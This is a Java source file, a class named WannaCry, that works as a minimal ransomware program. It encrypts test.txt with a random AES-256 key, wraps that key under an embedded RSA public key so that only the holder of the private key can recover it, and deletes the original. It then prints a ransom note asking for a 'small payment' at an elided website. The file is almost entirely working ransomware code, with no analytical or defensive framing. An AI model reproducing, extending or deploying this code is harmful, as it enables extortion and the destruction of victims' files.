import javax.crypto.*;
import javax.crypto.spec.*;
import java.nio.file.*;
import java.security.*;
import java.security.spec.*;
import java.util.Base64;

public class WannaCry {
    private static final String MASTER_PUBLIC_KEY_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpPqoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXdtcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w16YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1eWi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";

    public static void main(String[] args) {
        try {
            Path inputFile = Paths.get("test.txt");
            if (!Files.exists(inputFile)) {
                System.err.println("Error: test.txt not found");
                System.exit(1);
            }

            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(256);
            SecretKey aesKey = keyGen.generateKey();

            byte[] iv = new byte[16];
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            Cipher aesCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, ivSpec);

            byte[] plaintext = Files.readAllBytes(inputFile);
            byte[] ciphertext = aesCipher.doFinal(plaintext);

            byte[] masterKeyBytes = Base64.getDecoder().decode(MASTER_PUBLIC_KEY_B64);
            X509EncodedKeySpec keySpec = new X509EncodedKeySpec(masterKeyBytes);
            PublicKey masterPublicKey = KeyFactory.getInstance("RSA").generatePublic(keySpec);

            Cipher rsaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            rsaCipher.init(Cipher.ENCRYPT_MODE, masterPublicKey);
            byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());

            // Write encrypted files before deleting original to avoid data loss
            Files.write(Paths.get("test.txt.cry"), ciphertext);
            Files.write(Paths.get("aes.key"), encryptedAesKey);
            Files.delete(inputFile);

            System.out.println();
            System.out.println("Dear User! Please note that your files have now been encrypted.");
            System.out.println("To recover your files we ask you to follow the instructions");
            System.out.println("in the website below to arrange a small payment:");
            System.out.println("https://...");
            System.out.println();

        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
            System.exit(1);
        }
    }
}
